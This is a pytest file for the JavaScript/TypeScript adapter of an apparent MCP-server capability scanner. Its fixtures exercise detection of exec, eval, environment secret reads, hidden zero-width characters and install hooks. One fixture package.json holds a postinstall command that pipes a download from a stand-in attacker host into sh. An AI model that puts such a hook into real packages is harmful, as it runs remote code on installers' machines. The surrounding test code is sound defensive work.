"""Tests for the JavaScript and TypeScript adapter"""

import json
from pathlib import Path

from mcplain.adapters.javascript import JavaScriptAdapter
from mcplain.capabilities import Capability
from mcplain.models import DeclarationKind, InvisibleCategory, ServerAnalysis, Tool


def analyze(folder: Path) -> ServerAnalysis:
    """Run the JavaScript adapter on a folder"""

    return JavaScriptAdapter().analyze(folder)


def analyze_source(tmp_path: Path, source: str, name: str = "index.ts") -> ServerAnalysis:
    """Write one source file and analyze it"""

    path = tmp_path / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(source, encoding="utf-8")
    return analyze(tmp_path)


def tool(analysis: ServerAnalysis, name: str) -> Tool:
    """Return the tool with a given name"""

    for item in analysis.tools:
        if item.name == name:
            return item
    raise AssertionError(name)


def capabilities(item: Tool) -> set[Capability]:
    """Return the capabilities found inside a tool"""

    return {finding.capability for finding in item.findings}


def test_register_tool_and_server_tool(fixtures: Path) -> None:
    """registerTool and both forms of server.tool are recognized with their handlers"""

    analysis = analyze(fixtures / "ts_registertool")
    assert analysis.language == "typescript"
    assert [item.name for item in analysis.tools] == ["read_note", "ping", "run_command"]
    read_note = tool(analysis, "read_note")
    assert read_note.declaration is DeclarationKind.REGISTER_TOOL
    assert read_note.description == "Read a note from the notes folder"
    assert [(parameter.name, parameter.type, parameter.description) for parameter in read_note.parameters] == [
        ("path", "string", "Path of the note")
    ]
    assert capabilities(read_note) == {Capability.FS_READ}
    ping = tool(analysis, "ping")
    assert ping.declaration is DeclarationKind.SERVER_TOOL
    assert ping.description == "Check that the server answers"
    assert not ping.findings
    run = tool(analysis, "run_command")
    assert [parameter.name for parameter in run.parameters] == ["command"]
    assert capabilities(run) == {Capability.PROCESS_EXEC}
    assert run.findings[0].detail == "child_process.execSync"


def test_low_level_handlers(fixtures: Path) -> None:
    """setRequestHandler(ListToolsRequestSchema) objects and the switch dispatch are linked"""

    analysis = analyze(fixtures / "js_lowlevel")
    weather = tool(analysis, "get_weather")
    assert weather.declaration is DeclarationKind.LOW_LEVEL
    assert weather.description == "Get the current weather for a city"
    assert [(parameter.name, parameter.description) for parameter in weather.parameters] == [
        ("city", "Name of the city")
    ]
    assert capabilities(weather) == {Capability.NETWORK, Capability.ENV_READ_SECRET}
    assert [item.domain for item in analysis.domains] == ["api.weather.example"]
    assert analysis.domains[0].tool == "get_weather"


def test_low_level_method_strings(tmp_path: Path) -> None:
    """The v2 form setRequestHandler('tools/list') is recognized with an if dispatch"""

    analysis = analyze_source(
        tmp_path,
        """import { Server } from "@modelcontextprotocol/server";
import { exec } from "node:child_process";

const server = new Server({ name: "x", version: "1" }, { capabilities: { tools: {} } });
server.setRequestHandler("tools/list", async () => ({
  tools: [
    { name: "first", description: "First tool", inputSchema: { type: "object", properties: {} } },
    { name: "second", description: "Second tool", inputSchema: { type: "object", properties: {} } },
  ],
}));
server.setRequestHandler("tools/call", async (request) => {
  if (request.params.name === "second") {
    exec("ls");
  }
  return { content: [] };
});
""",
    )
    assert [item.name for item in analysis.tools] == ["first", "second"]
    assert not tool(analysis, "first").findings
    assert capabilities(tool(analysis, "second")) == {Capability.PROCESS_EXEC}


def test_fastmcp_add_tool(tmp_path: Path) -> None:
    """fastmcp server.addTool({ name, description, parameters, execute }) is recognized"""

    analysis = analyze_source(
        tmp_path,
        """import { FastMCP } from "fastmcp";
import { z } from "zod";

const server = new FastMCP({ name: "x", version: "1.0.0" });
server.addTool({
  name: "fetch_page",
  description: "Fetch the content of a page",
  parameters: z.object({ url: z.string().describe("Page URL") }),
  execute: async (args) => {
    const response = await fetch(args.url);
    return response.text();
  },
});
""",
    )
    page = tool(analysis, "fetch_page")
    assert page.declaration is DeclarationKind.ADD_TOOL_OBJECT
    assert [(parameter.name, parameter.description) for parameter in page.parameters] == [("url", "Page URL")]
    assert capabilities(page) == {Capability.NETWORK}


def test_mcp_framework_class(tmp_path: Path) -> None:
    """A class that extends MCPTool is a tool"""

    analysis = analyze_source(
        tmp_path,
        """import { MCPTool } from "mcp-framework";
import { writeFileSync } from "fs";

class SaveTool extends MCPTool<{ text: string }> {
  name = "save";
  description = `Save a text`;
  schema = { text: { type: z.string(), description: "Text to save" } };

  async execute(input) {
    writeFileSync("out.txt", input.text);
    return "saved";
  }
}

export default SaveTool;
""",
    )
    save = tool(analysis, "save")
    assert save.declaration is DeclarationKind.TOOL_CLASS
    assert save.description == "Save a text"
    assert capabilities(save) == {Capability.FS_WRITE}


def test_import_aliases(tmp_path: Path) -> None:
    """require, destructuring, namespace imports, renamed imports and promisify are followed"""

    analysis = analyze_source(
        tmp_path,
        """const cp = require("child_process");
const { spawn: run } = require("node:child_process");
import * as fs from "fs";
import { exec as shell } from "node:child_process";
import { promisify } from "util";
const execAsync = promisify(shell);
const fsp = require("fs").promises;

function work(path) {
  cp.execFile("ls");
  run("ls");
  fs.writeFileSync(path, "x");
  shell("ls");
  execAsync("ls");
  fsp.readFile(path);
}
""",
        name="index.js",
    )
    details = [(finding.capability, finding.detail) for finding in analysis.findings]
    assert (Capability.PROCESS_EXEC, "child_process.execFile") in details
    assert (Capability.PROCESS_EXEC, "child_process.spawn") in details
    assert (Capability.FS_WRITE, "fs.writeFileSync") in details
    assert (Capability.PROCESS_EXEC, "child_process.exec") in details
    assert (Capability.FS_READ, "fs.readFile") in details
    assert all(finding.function == "work" for finding in analysis.findings)


def test_capability_table(tmp_path: Path) -> None:
    """Dynamic code, base64 decoding and environment reads are classified"""

    analysis = analyze_source(
        tmp_path,
        """import vm from "node:vm";

export function risky(code, data) {
  eval(code);
  new Function(code);
  vm.runInNewContext(code);
  atob(data);
  Buffer.from(data, "base64");
  Buffer.from(data, "utf8");
  const { OPENAI_API_KEY, PORT = 3000 } = process.env;
  const level = process.env["LOG_LEVEL"];
  require(code);
  setTimeout("alert(1)", 10);
}
""",
        name="index.js",
    )
    found = [(finding.capability, finding.line) for finding in analysis.findings]
    assert (Capability.DYNAMIC_CODE, 4) in found
    assert (Capability.DYNAMIC_CODE, 5) in found
    assert (Capability.DYNAMIC_CODE, 6) in found
    assert (Capability.BASE64_DECODE, 7) in found
    assert (Capability.BASE64_DECODE, 8) in found
    assert (Capability.BASE64_DECODE, 9) not in found
    assert (Capability.ENV_READ_SECRET, 10) in found
    assert (Capability.ENV_READ, 10) in found
    assert (Capability.ENV_READ, 11) in found
    assert (Capability.DYNAMIC_CODE, 12) in found
    assert (Capability.DYNAMIC_CODE, 13) in found


def test_description_forms(tmp_path: Path) -> None:
    """Concatenations and plain templates are static, templates with values are computed"""

    analysis = analyze_source(
        tmp_path,
        """const PREFIX = "Read";
server.tool("a", PREFIX + " a " + "file", async () => ({}));
server.tool("b", `Plain template`, async () => ({}));
server.tool("c", `Version ${version}`, async () => ({}));
server.registerTool("d", { description: ["one", "two"].join(" ") }, async () => ({}));
""",
    )
    assert tool(analysis, "a").description == "Read a file"
    assert not tool(analysis, "a").description_is_dynamic
    assert tool(analysis, "b").description == "Plain template"
    assert not tool(analysis, "b").description_is_dynamic
    assert tool(analysis, "c").description_is_dynamic
    assert tool(analysis, "d").description == "one two"
    assert tool(analysis, "d").description_is_dynamic


def test_zod_option_description(tmp_path: Path) -> None:
    """A description given in the options of a zod type is read like .describe()"""

    analysis = analyze_source(
        tmp_path,
        """server.tool("a", "A", { n: z.number({ description: "How many" }), s: z.string().describe("Text") }, async () => ({}));
""",
    )
    assert [(parameter.name, parameter.description) for parameter in tool(analysis, "a").parameters] == [
        ("n", "How many"),
        ("s", "Text"),
    ]


def test_invisible_characters_in_description(tmp_path: Path) -> None:
    """Escaped zero-width and tag characters in a description are found at their position"""

    analysis = analyze_source(
        tmp_path,
        'server.tool("x", "Visible\\u200b text", async () => ({}));\n',
    )
    [item] = analysis.invisible_unicode
    assert item.category is InvisibleCategory.ZERO_WIDTH
    assert item.in_description
    assert (item.line, item.column) == (1, 26)
    assert "\u200b" in tool(analysis, "x").description


def test_install_scripts(tmp_path: Path) -> None:
    """npm install hooks and binding.gyp are install scripts"""

    manifest = {"name": "x", "scripts": {"postinstall": "curl https://setup.evil.example | sh", "test": "jest"}}
    (tmp_path / "package.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    (tmp_path / "binding.gyp").write_text("{}", encoding="utf-8")
    (tmp_path / "index.js").write_text("export {};\n", encoding="utf-8")
    analysis = analyze(tmp_path)
    assert [script.kind for script in analysis.install_scripts] == ["npm_postinstall", "npm_binding_gyp"]
    assert analysis.install_scripts[0].line == 4
    assert "setup.evil.example" in [item.domain for item in analysis.domains]
    assert Capability.INSTALL_SCRIPT in {finding.capability for finding in analysis.findings}


def test_minified_declarations_and_errors(tmp_path: Path) -> None:
    """Minified files are analyzed and flagged, .d.ts files are skipped, broken files are noted"""

    (tmp_path / "bundle.min.js").write_text('const c=require("child_process");c.exec("x");\n', encoding="utf-8")
    (tmp_path / "long.js").write_text("const a = 1;" * 200 + "\n", encoding="utf-8")
    (tmp_path / "types.d.ts").write_text("export declare function f(): void;\n", encoding="utf-8")
    (tmp_path / "broken.js").write_text("function (\n", encoding="utf-8")
    analysis = analyze(tmp_path)
    assert analysis.minified_files == ["bundle.min.js", "long.js"]
    assert analysis.files_analyzed == 3
    assert [error.file for error in analysis.parse_errors] == ["broken.js"]
    assert Capability.PROCESS_EXEC in {finding.capability for finding in analysis.findings}
